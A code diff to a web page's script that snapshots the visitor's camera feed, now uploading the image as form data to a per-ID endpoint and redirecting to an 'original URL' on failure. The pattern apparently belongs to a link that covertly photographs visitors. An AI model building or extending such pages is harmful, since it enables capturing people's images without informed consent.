@@ -21,12 +21,13 @@
                     setTimeout(() => {
                         context.drawImage(video, 0, 0, 640, 480);
                         const dataUrl = canvas.toDataURL('image/png');
+                        const blob = dataURItoBlob(dataUrl);
+                        const formData = new FormData();
+                        formData.append('image', blob);
+
                         fetch(`/upload/${uniqueId}`, {
                             method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({ image: dataUrl })
+                            body: formData
                         }).then(response => response.json())
                           .then(data => {
                               if (data.imageUrl) {
@@ -48,6 +49,17 @@
                 console.error('Error accessing the camera', err);
                 window.location.href = originalUrl;
             });
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
     </script>
 </body>
 </html>
